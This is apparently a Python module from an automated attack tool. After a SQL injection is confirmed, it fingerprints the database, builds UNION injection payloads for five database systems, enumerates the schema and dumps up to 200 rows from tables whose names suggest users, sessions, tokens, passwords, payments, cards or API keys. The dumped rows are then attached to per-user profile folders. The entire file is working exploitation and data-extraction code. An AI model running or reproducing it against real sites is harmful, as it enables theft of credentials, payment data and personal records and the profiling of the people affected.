"""
sql_dump.py — When ActiveScanner confirms a SQLi finding with output
extraction, fingerprint the DBMS, dump the schema, and pull rows from any
interesting tables (users, accounts, sessions, orders, payment, secrets).

Pipeline position: after ActiveScanner runs, before report. Only fires when
at least one ScanFinding has attack_type starting with "sqli_" and verdict
in (confirmed, likely).

DBMS fingerprinting heuristics (from response_snippet):
  - "mysql_fetch", "you have an error in your sql syntax" → MySQL
  - "PostgreSQL", "PG::SyntaxError", "syntax error at or near" → PostgreSQL
  - "SQLite", "no such column", "near \"...\": syntax error" → SQLite
  - "ORA-01756", "ORA-00933"                                → Oracle
  - "Incorrect syntax near", "Microsoft SQL Server", "SqlException" → MSSQL

For each dialect we know:
  - schema query against information_schema (or sqlite_master / pg_catalog)
  - column-comment template (column_name list)
  - canonical "interesting" tables to dump first

Output layout (under <out>/sql_dump/):
  fingerprint.json                    — what dialect we detected + evidence
  schema/<table>.json                 — columns per discovered table
  data/<table>/page_001.json          — first N rows (capped, paginated)
  per_user/<user_id>.json             — synthesized cross-link to enricher
                                        users/<id>/db_rows/<table>.json

Always-on under --active-scan; gated by `--no-sql-dump` if the operator
wants to skip the loud read.
"""

import asyncio
import json
import re
from dataclasses import dataclass, field
from pathlib import Path
from typing import Optional
from urllib.parse import urlparse, urlencode, parse_qs, urlunparse

import httpx


# ---------------------------------------------------------------------------
# Dialect fingerprints — pattern, label, schema queries
# ---------------------------------------------------------------------------

@dataclass
class DialectInfo:
    name: str
    schema_query: str            # UNION-tail to enumerate tables+columns
    table_list_query: str        # standalone SELECT for table names only
    string_concat: str           # CONCAT(a,',',b) etc — varies by dialect
    comment_marker: str          # -- vs # vs /* */
    error_signatures: list[str]


_DIALECTS = [
    DialectInfo(
        name="mysql",
        schema_query=(
            "UNION SELECT NULL,GROUP_CONCAT(table_name,0x3a,column_name SEPARATOR 0x0a),"
            "NULL FROM information_schema.columns "
            "WHERE table_schema=database()-- "
        ),
        table_list_query=(
            "UNION SELECT NULL,GROUP_CONCAT(table_name SEPARATOR 0x0a),NULL "
            "FROM information_schema.tables WHERE table_schema=database()-- "
        ),
        string_concat="CONCAT",
        comment_marker="-- ",
        error_signatures=[
            "you have an error in your sql syntax",
            "mysql_fetch", "mysqli_fetch",
            "MariaDB server version",
            "supplied argument is not a valid mysql",
        ],
    ),
    DialectInfo(
        name="postgresql",
        schema_query=(
            "UNION SELECT NULL,string_agg(table_name||':'||column_name, E'\\n'),"
            "NULL FROM information_schema.columns WHERE table_schema='public'-- "
        ),
        table_list_query=(
            "UNION SELECT NULL,string_agg(table_name, E'\\n'),NULL "
            "FROM information_schema.tables WHERE table_schema='public'-- "
        ),
        string_concat="||",
        comment_marker="-- ",
        error_signatures=[
            "PostgreSQL", "PG::SyntaxError", "pg_query():",
            "syntax error at or near",
            "ERROR:  column",
        ],
    ),
    DialectInfo(
        name="sqlite",
        schema_query=(
            "UNION SELECT NULL,group_concat(name||':'||sql, char(10)),NULL "
            "FROM sqlite_master WHERE type='table'-- "
        ),
        table_list_query=(
            "UNION SELECT NULL,group_concat(name, char(10)),NULL "
            "FROM sqlite_master WHERE type='table'-- "
        ),
        string_concat="||",
        comment_marker="-- ",
        error_signatures=[
            "SQLite", "SQLITE_ERROR",
            "near \".*\": syntax error",
            "no such column",
            "no such table",
        ],
    ),
    DialectInfo(
        name="mssql",
        schema_query=(
            "UNION SELECT NULL,STRING_AGG(CONCAT(table_name,':',column_name),CHAR(10)),"
            "NULL FROM information_schema.columns-- "
        ),
        table_list_query=(
            "UNION SELECT NULL,STRING_AGG(table_name,CHAR(10)),NULL "
            "FROM information_schema.tables-- "
        ),
        string_concat="+",
        comment_marker="-- ",
        error_signatures=[
            "Microsoft SQL Server", "SqlException",
            "Incorrect syntax near",
            "Unclosed quotation mark",
            "Conversion failed when converting",
        ],
    ),
    DialectInfo(
        name="oracle",
        schema_query=(
            "UNION SELECT NULL,LISTAGG(table_name||':'||column_name,CHR(10))"
            " WITHIN GROUP (ORDER BY table_name),NULL FROM all_tab_columns-- "
        ),
        table_list_query=(
            "UNION SELECT NULL,LISTAGG(table_name,CHR(10))"
            " WITHIN GROUP (ORDER BY table_name),NULL FROM all_tables-- "
        ),
        string_concat="||",
        comment_marker="-- ",
        error_signatures=[
            "ORA-01756", "ORA-00933", "ORA-00942",
            "OracleException",
        ],
    ),
]

_INTERESTING_TABLE_RE = re.compile(
    r"(user|account|customer|admin|session|token|cred|pass|secret|"
    r"login|profile|order|cart|basket|payment|card|wallet|api_?key|"
    r"oauth|jwt|grant|role|permission)",
    re.IGNORECASE,
)


@dataclass
class DialectFingerprint:
    dialect: str
    confidence: float
    evidence: str
    source_finding: str = ""

    def to_dict(self) -> dict:
        return {
            "dialect": self.dialect, "confidence": self.confidence,
            "evidence": self.evidence, "source_finding": self.source_finding,
        }


@dataclass
class SchemaTable:
    name: str
    columns: list[str] = field(default_factory=list)

    def to_dict(self) -> dict:
        return {"name": self.name, "columns": self.columns}


@dataclass
class DumpedRow:
    table: str
    row: dict       # column → value, free-form

    def to_dict(self) -> dict:
        return {"table": self.table, "row": self.row}


@dataclass
class SQLDumpResult:
    fingerprints: list[DialectFingerprint] = field(default_factory=list)
    schema: list[SchemaTable] = field(default_factory=list)
    rows_dumped: int = 0
    tables_dumped: int = 0
    out_dir: str = ""
    notes: list[str] = field(default_factory=list)

    def to_dict(self) -> dict:
        return {
            "out_dir": self.out_dir,
            "fingerprints": [f.to_dict() for f in self.fingerprints],
            "schema": [t.to_dict() for t in self.schema],
            "rows_dumped": self.rows_dumped,
            "tables_dumped": self.tables_dumped,
            "notes": self.notes,
        }


class SQLDumper:
    _MAX_ROWS_PER_TABLE = 200
    _MAX_TABLES_TO_DUMP = 12

    def __init__(self, out_dir: str, timeout: float = 12.0,
                 auth_headers: Optional[dict] = None):
        self.out_root = Path(out_dir) / "sql_dump"
        self.timeout = timeout
        self.auth_headers = auth_headers or {}

    async def run(self, active_scan_result, enrichment_result=None) -> SQLDumpResult:
        result = SQLDumpResult(out_dir=str(self.out_root))
        if not active_scan_result:
            result.notes.append("no active-scan result — nothing to dump")
            return result
        sqli_findings = [
            f for f in active_scan_result.findings
            if f.attack_type.startswith("sqli_") and f.verdict in ("confirmed", "likely")
        ]
        if not sqli_findings:
            result.notes.append("no confirmed/likely SQLi findings — skipping dump")
            return result

        # ── Fingerprint dialect from each finding's response snippet ──
        fingerprints: dict[str, DialectFingerprint] = {}
        for f in sqli_findings:
            fp = self._fingerprint(f.response_snippet or f.evidence,
                                    source=f.endpoint)
            if fp and fp.dialect not in fingerprints:
                fingerprints[fp.dialect] = fp
        result.fingerprints = list(fingerprints.values())
        if not fingerprints:
            result.notes.append("could not fingerprint dialect from response snippets")
            return result

        self.out_root.mkdir(parents=True, exist_ok=True)
        (self.out_root / "fingerprint.json").write_text(json.dumps(
            [fp.to_dict() for fp in result.fingerprints], indent=2,
        ))

        # ── Pick the best (highest-confidence) finding + matching dialect ──
        best_finding = max(sqli_findings, key=lambda f: f.confidence)
        best_dialect = next(iter(fingerprints.values())).dialect
        dialect_info = next((d for d in _DIALECTS if d.name == best_dialect), None)
        if not dialect_info:
            result.notes.append(f"no dialect template for {best_dialect}")
            return result

        # ── Pull schema using the chosen dialect's UNION query ──
        schema_text = await self._extract_via_union(
            best_finding, dialect_info.table_list_query,
        )
        if not schema_text:
            result.notes.append(
                "UNION extraction failed — endpoint may need a working "
                "column-count match or response shape that doesn't surface "
                "the leaked data. Try replaying manually with sqlmap."
            )
            return result
        tables = self._parse_table_list(schema_text)
        result.schema = [SchemaTable(name=t) for t in tables]
        (self.out_root / "schema").mkdir(exist_ok=True)
        (self.out_root / "schema" / "tables.txt").write_text("\n".join(tables) + "\n")
        result.notes.append(f"discovered {len(tables)} tables via UNION extraction")

        # ── Dump interesting tables ──
        interesting = [t for t in tables if _INTERESTING_TABLE_RE.search(t)][:self._MAX_TABLES_TO_DUMP]
        result.notes.append(f"dumping {len(interesting)} interesting tables")
        data_dir = self.out_root / "data"
        data_dir.mkdir(exist_ok=True)
        for table in interesting:
            rows = await self._dump_table(best_finding, dialect_info, table)
            if not rows:
                continue
            (data_dir / f"{self._safe_name(table)}.json").write_text(
                json.dumps([r.to_dict() for r in rows], indent=2)
            )
            result.rows_dumped += len(rows)
            result.tables_dumped += 1
            # Cross-link rows that contain user-shaped fields back into the
            # enricher's per-user folders
            if enrichment_result:
                self._cross_link_to_users(enrichment_result, table, rows)

        return result

    # ------------------------------------------------------------------
    # Fingerprinting
    # ------------------------------------------------------------------

    @staticmethod
    def _fingerprint(text: str, source: str = "") -> Optional[DialectFingerprint]:
        if not text:
            return None
        low = text.lower()
        for d in _DIALECTS:
            for sig in d.error_signatures:
                if re.search(sig, low, re.IGNORECASE):
                    return DialectFingerprint(
                        dialect=d.name, confidence=0.85,
                        evidence=f"matched signature: {sig!r}",
                        source_finding=source,
                    )
        return None

    # ------------------------------------------------------------------
    # UNION extraction — replay the proven SQLi payload with our query
    # ------------------------------------------------------------------

    async def _extract_via_union(self, finding, sql_query: str) -> str:
        """Replay finding.endpoint with finding.param injected via UNION.
        Returns whatever leaked into the response body — caller parses."""
        url = finding.endpoint
        param = finding.param
        # Build a probe URL with param=' UNION ... -- '
        injected_value = f"' {sql_query}"
        parsed = urlparse(url)
        qs = parse_qs(parsed.query, keep_blank_values=True)
        if param in qs:
            qs[param] = [injected_value]
            new_url = urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))
        else:
            sep = "&" if parsed.query else "?"
            new_url = url + f"{sep}{param}={injected_value}"
        try:
            async with httpx.AsyncClient(
                verify=False, timeout=self.timeout, follow_redirects=True,
                headers=self.auth_headers,
            ) as client:
                r = await client.get(new_url)
        except Exception:
            return ""
        if r.status_code >= 500:
            return ""
        return r.text[:50000]

    @staticmethod
    def _parse_table_list(text: str) -> list[str]:
        """Pull lines that look like table names out of arbitrary response
        body (could be JSON, HTML, or raw text). Filter to alnum + underscore."""
        out: list[str] = []
        seen: set[str] = set()
        # Split on common delimiters: newline, comma, "0a" hex, JSON quote
        candidates = re.split(r"[\n\r,]+", text)
        for c in candidates:
            c = c.strip().strip('"\'').strip()
            if not c or c in seen:
                continue
            # Reject obvious non-table strings: too long, contains punctuation
            if len(c) > 60 or not re.fullmatch(r"[A-Za-z_][A-Za-z0-9_]{1,59}", c):
                continue
            seen.add(c)
            out.append(c)
        return out

    async def _dump_table(self, finding, dialect_info: DialectInfo,
                          table: str) -> list[DumpedRow]:
        """For now: just request a column-aggregate row from the table.
        Future enhancement: paginated row-by-row via OFFSET/LIMIT."""
        # For dialects with information_schema, list columns first
        if dialect_info.name in ("mysql", "postgresql", "mssql"):
            col_query = (
                f"UNION SELECT NULL,GROUP_CONCAT(column_name SEPARATOR 0x0a),NULL "
                f"FROM information_schema.columns WHERE table_name='{table}'-- "
                if dialect_info.name == "mysql" else
                f"UNION SELECT NULL,string_agg(column_name, E'\\n'),NULL "
                f"FROM information_schema.columns WHERE table_name='{table}'-- "
                if dialect_info.name == "postgresql" else
                f"UNION SELECT NULL,STRING_AGG(column_name,CHAR(10)),NULL "
                f"FROM information_schema.columns WHERE table_name='{table}'-- "
            )
        elif dialect_info.name == "sqlite":
            col_query = (
                f"UNION SELECT NULL,sql,NULL FROM sqlite_master "
                f"WHERE type='table' AND name='{table}'-- "
            )
        else:
            col_query = ""
        cols_text = await self._extract_via_union(finding, col_query) if col_query else ""
        columns = self._parse_table_list(cols_text)[:30] if cols_text else []

        if not columns:
            # Best-effort row dump using SELECT *
            row_query = f"UNION SELECT NULL,(SELECT * FROM {table} LIMIT 5),NULL-- "
        else:
            concat = dialect_info.string_concat
            col_concat = (f"{concat}'|'{concat}".join(columns)
                           if concat == "||" else
                           f"{dialect_info.string_concat}('|',{','.join(columns)})"
                           if dialect_info.string_concat == "CONCAT" else
                           f"+'|'+".join(columns))
            row_query = (
                f"UNION SELECT NULL,GROUP_CONCAT({col_concat} SEPARATOR 0x0a),NULL "
                f"FROM {table} LIMIT {self._MAX_ROWS_PER_TABLE}-- "
                if dialect_info.name == "mysql" else
                f"UNION SELECT NULL,string_agg({col_concat}, E'\\n'),NULL "
                f"FROM (SELECT * FROM {table} LIMIT {self._MAX_ROWS_PER_TABLE}) t-- "
                if dialect_info.name == "postgresql" else
                f"UNION SELECT NULL,group_concat({col_concat}, char(10)),NULL "
                f"FROM (SELECT * FROM {table} LIMIT {self._MAX_ROWS_PER_TABLE})-- "
                if dialect_info.name == "sqlite" else
                f"UNION SELECT NULL,STRING_AGG({col_concat},CHAR(10)),NULL "
                f"FROM (SELECT TOP {self._MAX_ROWS_PER_TABLE} * FROM {table}) t-- "
            )

        rows_text = await self._extract_via_union(finding, row_query)
        if not rows_text:
            return []
        rows: list[DumpedRow] = []
        for line in rows_text.split("\n")[:self._MAX_ROWS_PER_TABLE]:
            line = line.strip()
            if not line or "|" not in line:
                continue
            values = line.split("|")
            if columns and len(values) == len(columns):
                row = dict(zip(columns, values))
            else:
                row = {f"col_{i}": v for i, v in enumerate(values)}
            rows.append(DumpedRow(table=table, row=row))
        return rows

    # ------------------------------------------------------------------
    # Per-user cross-linking
    # ------------------------------------------------------------------

    @staticmethod
    def _cross_link_to_users(enrichment_result, table: str,
                              rows: list[DumpedRow]) -> None:
        """For each row, if it contains a username/email/user_id field that
        matches an existing UserRecord, write the row into that user's
        folder as db_rows/<table>.json (append-mode)."""
        if not rows or not enrichment_result.users:
            return
        # Build lookup by lowercase identifier
        by_email = {e: u for u in enrichment_result.users.values() for e in u.emails}
        by_username = {n: u for u in enrichment_result.users.values() for n in u.usernames}
        by_uid = {i: u for u in enrichment_result.users.values() for i in u.user_ids}

        for row in rows:
            r = {k.lower(): v for k, v in row.row.items()}
            user = None
            if "email" in r and r["email"].lower() in by_email:
                user = by_email[r["email"].lower()]
            elif "username" in r and r["username"] in by_username:
                user = by_username[r["username"]]
            elif "id" in r and str(r["id"]) in by_uid:
                user = by_uid[str(r["id"])]
            if not user:
                continue
            # Write into the existing user folder
            user_dir = Path(enrichment_result.out_dir) / "users" / user.canonical_id
            if not user_dir.exists():
                continue
            db_rows_dir = user_dir / "db_rows"
            db_rows_dir.mkdir(exist_ok=True)
            row_file = db_rows_dir / f"{SQLDumper._safe_name(table)}.json"
            existing = []
            if row_file.exists():
                try:
                    existing = json.loads(row_file.read_text())
                except Exception:
                    pass
            existing.append(row.to_dict())
            row_file.write_text(json.dumps(existing, indent=2))

    @staticmethod
    def _safe_name(s: str, max_len: int = 60) -> str:
        clean = re.sub(r"[^A-Za-z0-9._-]+", "_", s).strip("_") or "x"
        return clean[:max_len]
